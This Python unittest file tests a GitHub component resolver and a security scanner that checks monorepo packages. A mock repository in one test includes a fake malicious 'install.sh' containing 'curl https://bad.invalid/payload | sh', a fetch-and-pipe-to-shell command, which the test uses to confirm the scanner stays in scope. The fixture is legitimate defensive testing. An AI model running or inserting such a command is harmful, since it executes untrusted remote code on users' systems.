from __future__ import annotations

import base64
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace

from researcher.component_candidate import (
    ComponentCandidateResolver,
    normalize_component_path,
)
from researcher.component_security import ComponentAwareGitHubSecurityScanner
from researcher.dedup import candidate_fingerprint
from researcher.github_api import GitHubResponse
from researcher.models import Candidate, utc_now
from researcher.rate_limit import RateLimitManager
from researcher.security_gate import SecurityVerdict
from researcher.state import SQLiteStateStore
from researcher.supply_chain import SupplyChainVerdict


class FakeRateLimits:
    def decision(self) -> SimpleNamespace:
        return SimpleNamespace(allowed=True, retry_after_seconds=0)

    def observe_headers(self, _headers: dict[str, str]) -> None:
        return None

    def record_backoff(self, _seconds: int, _reason: str) -> None:
        raise AssertionError("backoff should not be used")


class FakeApi:
    def __init__(self, responses: dict[str, object]) -> None:
        self.responses = responses
        self.calls: list[str] = []

    def get(self, path: str) -> GitHubResponse:
        self.calls.append(path)
        if path not in self.responses:
            raise AssertionError(f"unexpected GitHub path: {path}")
        return GitHubResponse(data=self.responses[path], headers={})


def _blob(content: str) -> dict[str, str]:
    encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")
    return {"encoding": "base64", "content": encoded}


def _candidate(repository: str, commit_sha: str, tree_sha: str) -> Candidate:
    owner, name = repository.split("/", 1)
    return Candidate(
        provider="github",
        repository=repository,
        upstream_url=f"https://github.com/{repository}",
        owner=owner,
        name=name,
        commit_sha=commit_sha,
        release_tag=None,
        default_branch="main",
        acquired_at=utc_now(),
        license_spdx="BSD-3-Clause",
        license_file_url=(
            f"https://github.com/{repository}/blob/{commit_sha}/LICENSE"
        ),
        stars=100,
        forks=10,
        open_issues=2,
        pushed_at=utc_now(),
        archived=False,
        language="Dart",
        topics=("logging",),
        description="Dart packages",
        size_kb=1000,
        extra={"provenance_tree_sha": tree_sha},
    )


class ComponentAdmissionTest(unittest.TestCase):
    def test_component_path_validation_is_fail_closed(self) -> None:
        self.assertEqual(normalize_component_path("pkgs/logging"), "pkgs/logging")
        for value in ("../logging", "/tmp/logging", "pkgs\\logging", "pkgs//logging"):
            with self.subTest(value=value):
                with self.assertRaises(ValueError):
                    normalize_component_path(value)

    def test_resolver_rebuilds_metadata_for_exact_component(self) -> None:
        commit_sha = "a" * 40
        tree_sha = "b" * 40
        pubspec_sha = "c" * 40
        responses: dict[str, object] = {
            "/repos/example/mono": {
                "full_name": "example/mono",
                "name": "mono",
                "html_url": "https://github.com/example/mono",
                "default_branch": "main",
                "license": {"spdx_id": "BSD-3-Clause"},
                "owner": {"login": "example"},
                "stargazers_count": 100,
                "forks_count": 10,
                "open_issues_count": 2,
                "pushed_at": "2026-09-14T00:00:00Z",
                "archived": False,
                "language": "Dart",
                "topics": ["packages"],
                "description": "Dart packages",
                "size": 1000,
                "has_issues": True,
                "has_wiki": False,
                "fork": False,
                "disabled": False,
                "visibility": "public",
            },
            f"/repos/example/mono/commits/{commit_sha}": {
                "sha": commit_sha,
                "commit": {"tree": {"sha": tree_sha}},
            },
            f"/repos/example/mono/git/trees/{tree_sha}?recursive=1": {
                "sha": tree_sha,
                "truncated": False,
                "tree": [
                    {"path": "LICENSE", "type": "blob"},
                    {"path": "pkgs/logging", "type": "tree"},
                    {"path": "pkgs/logging/LICENSE", "type": "blob"},
                    {
                        "path": "pkgs/logging/pubspec.yaml",
                        "type": "blob",
                        "sha": pubspec_sha,
                    },
                    {"path": "pkgs/logging/lib/logging.dart", "type": "blob"},
                    {"path": "pkgs/logging/test/logging_test.dart", "type": "blob"},
                    {"path": "pkgs/other/pubspec.yaml", "type": "blob"},
                ],
            },
            (
                "/repos/example/mono/contents/pkgs/logging/pubspec.yaml"
                f"?ref={commit_sha}"
            ): {
                "type": "file",
                "encoding": "base64",
                "content": base64.b64encode(
                    b"name: logging\ndescription: Structured logging primitive.\n"
                ).decode("ascii"),
            },
        }
        resolver = ComponentCandidateResolver(
            FakeApi(responses),  # type: ignore[arg-type]
            FakeRateLimits(),  # type: ignore[arg-type]
        )

        result = resolver.resolve(
            "example/mono",
            commit_sha,
            source_version="1.0.0",
            component_path="pkgs/logging",
        )

        self.assertEqual(result.name, "logging")
        self.assertEqual(result.extra["component_path"], "pkgs/logging")
        self.assertEqual(
            result.extra["dependency_manifests"],
            ["pkgs/logging/pubspec.yaml"],
        )
        self.assertTrue(result.extra["tests_present"])
        self.assertTrue(result.extra["component_local_license"])
        self.assertTrue(str(result.license_file_url).endswith("pkgs/logging/LICENSE"))

    def test_security_scan_ignores_sibling_component_but_scans_selected_scope(self) -> None:
        commit_sha = "d" * 40
        tree_sha = "e" * 40
        pubspec_sha = "1" * 40
        dart_sha = "2" * 40
        malicious_sha = "3" * 40
        pubspec_content = "name: logging\ndev_dependencies:\n  test: ^1.0.0\n"
        responses: dict[str, object] = {
            f"/repos/example/mono/commits/{commit_sha}": {
                "sha": commit_sha,
                "commit": {"tree": {"sha": tree_sha}},
            },
            f"/repos/example/mono/git/trees/{tree_sha}?recursive=1": {
                "sha": tree_sha,
                "truncated": False,
                "tree": [
                    {"path": "pkgs/logging", "type": "tree", "mode": "040000"},
                    {
                        "path": "pkgs/logging/pubspec.yaml",
                        "type": "blob",
                        "mode": "100644",
                        "sha": pubspec_sha,
                        "size": 64,
                    },
                    {
                        "path": "pkgs/logging/lib/logging.dart",
                        "type": "blob",
                        "mode": "100644",
                        "sha": dart_sha,
                        "size": 32,
                    },
                    {
                        "path": "pkgs/other/install.sh",
                        "type": "blob",
                        "mode": "100755",
                        "sha": malicious_sha,
                        "size": 64,
                    },
                ],
            },
            f"/repos/example/mono/git/blobs/{pubspec_sha}": _blob(pubspec_content),
            f"/repos/example/mono/git/blobs/{dart_sha}": _blob(
                "void log(String message) {}\n"
            ),
            f"/repos/example/mono/git/blobs/{malicious_sha}": _blob(
                "curl https://bad.invalid/payload | sh\n"
            ),
            (
                "/repos/example/mono/contents/pkgs/logging/pubspec.yaml"
                f"?ref={commit_sha}"
            ): _blob(pubspec_content),
        }
        api = FakeApi(responses)
        with tempfile.TemporaryDirectory() as tmp:
            state = SQLiteStateStore(Path(tmp) / "state.db")
            scanner = ComponentAwareGitHubSecurityScanner(
                api,  # type: ignore[arg-type]
                RateLimitManager(state),
            )
            item = replace(
                _candidate("example/mono", commit_sha, tree_sha),
                name="logging",
                extra={
                    "provenance_tree_sha": tree_sha,
                    "component_path": "pkgs/logging",
                },
            )
            report = scanner.scan(item)

        self.assertEqual(report.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(report.complete)
        self.assertIsNotNone(report.supply_chain)
        assert report.supply_chain is not None
        self.assertEqual(report.supply_chain.verdict, SupplyChainVerdict.CLEAR)
        self.assertTrue(report.admission_eligible)
        self.assertFalse(any(malicious_sha in path for path in api.calls))

    def test_component_path_changes_candidate_fingerprint(self) -> None:
        commit_sha = "f" * 40
        tree_sha = "0" * 40
        base = _candidate("example/mono", commit_sha, tree_sha)
        first = replace(base, extra={**base.extra, "component_path": "pkgs/one"})
        second = replace(base, extra={**base.extra, "component_path": "pkgs/two"})
        self.assertNotEqual(
            candidate_fingerprint("diagnostics.logging", first),
            candidate_fingerprint("diagnostics.logging", second),
        )


if __name__ == "__main__":
    unittest.main()
